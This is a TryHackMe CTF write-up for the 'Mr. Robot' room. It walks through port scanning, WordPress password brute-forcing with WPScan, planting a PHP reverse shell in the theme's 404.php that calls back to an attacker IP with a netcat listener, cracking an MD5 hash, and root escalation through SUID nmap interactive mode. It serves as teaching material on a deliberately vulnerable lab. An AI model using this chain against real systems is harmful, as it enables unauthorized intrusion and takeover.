# Mr. Robot CTF — TryHackMe Writeup

> **Platform:** TryHackMe — [Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
> **Difficulty:** Medium
> **Objective:** Find three hidden keys on the target machine.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Key 1 — robots.txt Discovery](#3-key-1--robotstxt-discovery)
4. [WordPress Login — Username Enumeration & Password Brute-Force](#4-wordpress-login--username-enumeration--password-brute-force)
5. [Initial Access — PHP Reverse Shell via Theme Editor](#5-initial-access--php-reverse-shell-via-theme-editor)
6. [Key 2 — Cracking the Robot User's Password Hash](#6-key-2--cracking-the-robot-users-password-hash)
7. [Key 3 — Privilege Escalation via SUID Nmap](#7-key-3--privilege-escalation-via-suid-nmap)
8. [MITRE ATT&CK TTP Mapping](#8-mitre-attck-ttp-mapping)

---

## 1. Reconnaissance

### Nmap Scan

Begin with a port scan to identify open services on the target:


![Nmap scan results - open ports](https://github.com/user-attachments/assets/83040969-512b-46dd-b823-8687be534d23)
![Nmap service version details](https://github.com/user-attachments/assets/68530bfb-e0ad-41f0-a5e7-9b0278bc0143)

**Key findings:**
- Port 80 — HTTP (web server)
- Port 443 — HTTPS
- Port 22 — SSH (closed)

---

## 2. Web Enumeration

### Landing Page

Navigate to `http://<MACHINE-IP>` in your browser. The site presents an interactive Mr. Robot-themed terminal experience.

![Mr. Robot themed landing page](https://github.com/user-attachments/assets/a94bdc60-1e62-460f-adb7-19e232841938)

### Directory Brute-Force with Gobuster

Run Gobuster to discover hidden paths and identify the CMS in use:

```bash
gobuster dir -u http://<MACHINE-IP> -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster scan results](https://github.com/user-attachments/assets/e320cf92-545f-4969-8aec-0a2dac056b20)
![Gobuster WordPress paths discovered](https://github.com/user-attachments/assets/21350ab1-7219-4a3b-9379-1ab7bf5949d7)

Notable paths discovered include `/wp-login`, confirming the site runs **WordPress**.

---

## 3. Key 1 — robots.txt Discovery

### Checking robots.txt

Browse to `http://<MACHINE-IP>/robots.txt`:

![robots.txt contents](https://github.com/user-attachments/assets/9547fad8-12e7-4fdd-81e3-96554c625d75)

The file reveals two entries:
- `key-1-of-3.txt` — the **first flag**
- `fsocity.dic` — a wordlist dictionary

Download both files:

```bash
wget http://<MACHINE-IP>/key-1-of-3.txt
wget http://<MACHINE-IP>/fsocity.dic
```

![Key 1 and dictionary file downloaded](https://github.com/user-attachments/assets/30207c94-b31b-4415-a55f-dae140385dd9)

### Cleaning the Dictionary

The `fsocity.dic` wordlist contains a large number of duplicate entries. Deduplicate it to speed up later brute-force attacks:

```bash
sort -u fsocity.dic > pass.txt
```

> **Note:** `sort -u` is equivalent to `sort | uniq` but more concise. This reduces the wordlist from ~858,000 lines to ~11,000 unique entries.

🚩 **Key 1 found.**

---

## 4. WordPress Login — Username Enumeration & Password Brute-Force

### Identifying the Username

Navigate to `http://<MACHINE-IP>/wp-login`:

![WordPress login page](https://github.com/user-attachments/assets/2b93ac37-52b3-4d3e-9b88-cd59a97ef156)

WordPress helpfully reveals whether a submitted username is valid via different error messages. Given the room's theme, try the username `elliot` (the protagonist of the Mr. Robot TV show). The error message changes from "Invalid username" to "Incorrect password" — confirming the username exists.

![Elliot username confirmed valid](https://github.com/user-attachments/assets/4e493534-8211-425b-a626-3dc8e081d927)

> **Alternative approach:** If context-based guessing were not possible, tools like `hydra` or `wpscan` could automate username enumeration using the same wordlist.

### Brute-Forcing the Password with WPScan

Use WPScan with the cleaned wordlist to brute-force `elliot`'s password:

```bash
wpscan --url http://<MACHINE-IP> --usernames elliot --passwords pass.txt
```

![WPScan brute-force - valid credentials found](https://github.com/user-attachments/assets/504b3437-a899-421d-8601-1e03e71ad43a)

WPScan returns a valid username/password combination. Log in to the WordPress admin panel.

![WordPress admin dashboard](https://github.com/user-attachments/assets/8190c8e6-f404-426a-aa86-d22d22bd0de1)

---

## 5. Initial Access — PHP Reverse Shell via Theme Editor

### Injecting a Reverse Shell

From the WordPress admin dashboard, navigate to:

**Appearance → Editor → 404.php**

![WordPress theme editor - 404.php selected](https://github.com/user-attachments/assets/8a7718c6-9ccc-4a19-aa9e-bd84d84b3dfd)

Replace the entire contents of `404.php` with a PHP reverse shell. On Kali Linux, a ready-made shell is available at:

```
/usr/share/webshells/php/php-reverse-shell.php
```

Alternatively, download it from: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Edit the following two variables in the shell script to match your machine:

```php
$ip = '<YOUR-IP>';   // Your TryHackMe VPN/attacker IP
$port = 4444;
```

![PHP reverse shell configuration](https://github.com/user-attachments/assets/e47f3c96-22b9-40b7-b2b7-52c87a93e235)

Click **Update File** to save the shell into the theme.

### Starting the Listener

On your attacker machine, start a Netcat listener:

```bash
nc -lvnp 4444
```

![Netcat listener started](https://github.com/user-attachments/assets/08699f92-6a44-4b42-bcb1-d7ce7512967c)

### Triggering the Shell

Because the payload is in `404.php`, navigate to any non-existent page on the WordPress site to trigger a 404 error and execute the shell:

```
http://<MACHINE-IP>/this-page-does-not-exist
```

![Reverse shell connection received](https://github.com/user-attachments/assets/09880e87-1636-415c-95e6-d6fe863fef43)

A shell connects back to your listener. You are now running as the `daemon` (or `www-data`) user.

---

## 6. Key 2 — Cracking the Robot User's Password Hash

### Discovering the Files

The second key is located at `/home/robot/key-2-of-3.txt`, but it is only readable by the `robot` user. However, the same directory contains a password file:

![/home/robot directory listing](https://github.com/user-attachments/assets/6b061843-7993-4641-b885-2912410bb07a)

The file `password.raw-md5` contains an MD5 hash belonging to the `robot` user.

### Cracking the Hash

Submit the MD5 hash to [CrackStation](https://crackstation.net/) for offline lookup.

![CrackStation - hash cracked](https://github.com/user-attachments/assets/8bc4c88a-f87e-4d48-96cd-484511e3202b)

The plaintext password is recovered successfully.

### Switching to the Robot User

Use the cracked password to switch users:

```bash
su robot
# enter cracked password when prompted
```

> **Note:** If you receive a "must be run from a terminal" error, upgrade your shell first:
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

Now read the second key:

```bash
cat /home/robot/key-2-of-3.txt
```

![Key 2 retrieved](https://github.com/user-attachments/assets/b257766c-227d-4e2d-ba91-04172cd2e526)

🚩 **Key 2 found.**

---

## 7. Key 3 — Privilege Escalation via SUID Nmap

### Finding SUID Binaries

The third key is at `/root/key-3-of-3.txt` and requires root access. Search for binaries with the SUID bit set — these run with the owner's privileges (often root) regardless of who executes them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID binaries listed](https://github.com/user-attachments/assets/582634c7-01e2-47af-846d-2197128c8219)

The output includes `/usr/local/bin/nmap` — an older version of Nmap that supports `--interactive` mode, which can spawn a shell.

### Exploiting Nmap Interactive Mode

```bash
nmap --interactive
nmap> !sh
```

This spawns a shell inheriting Nmap's root SUID privileges.

![Root shell obtained via nmap --interactive](https://github.com/user-attachments/assets/d719eb30-0a54-430e-9182-26ae8680bdf3)

Confirm root access and retrieve the final key:

```bash
whoami
# root
cat /root/key-3-of-3.txt
```

🚩 **Key 3 found. Room complete.**

---

## 8. MITRE ATT&CK TTP Mapping

| Phase | TTP ID | Technique | How It Was Used |
|---|---|---|---|
| Reconnaissance | T1595.001 | Active Scanning: IP Blocks | Nmap port and service scan |
| Reconnaissance | T1592.002 | Gather Victim Host Info: Software | WordPress identified via Gobuster |
| Discovery | T1083 | File and Directory Discovery | `robots.txt` revealed key and dictionary |
| Discovery | T1518.001 | Security Software Discovery | WordPress version and login panel discovered via Gobuster |
| Credential Access | T1110.001 | Brute Force: Password Guessing | Username `elliot` guessed from room theme context |
| Credential Access | T1110.003 | Brute Force: Password Spraying | WPScan used with `fsocity.dic` to brute-force WordPress password |
| Credential Access | T1110.002 | Brute Force: Password Cracking | MD5 hash of `robot` user cracked via CrackStation |
| Initial Access | T1078 | Valid Accounts | Logged into WordPress admin panel with discovered `elliot` credentials |
| Execution | T1059.004 | Command Interpreter: Unix Shell | PHP reverse shell injected into `404.php` for RCE |
| Persistence | T1505.003 | Web Shell | PHP reverse shell persisted in WordPress theme file |
| Command & Control | T1071.001 | Application Layer Protocol: Web | Reverse shell triggered over HTTP; C2 via Netcat |
| Lateral Movement | T1078 | Valid Accounts | Switched to `robot` user via `su` with cracked password |
| Privilege Escalation | T1548.001 | Abuse Elevation: Setuid/Setgid | SUID `nmap` binary exploited via `--interactive` mode to spawn root shell |

---

## Key Summary

| Key | Location | How Obtained |
|---|---|---|
| Key 1 | `/key-1-of-3.txt` | Discovered via `robots.txt` |
| Key 2 | `/home/robot/key-2-of-3.txt` | MD5 hash cracked → `su robot` |
| Key 3 | `/root/key-3-of-3.txt` | Privilege escalation via SUID `nmap` |

---

*Writeup for the Mr. Robot CTF room on TryHackMe. All techniques demonstrated against an intentionally vulnerable, isolated lab environment.*
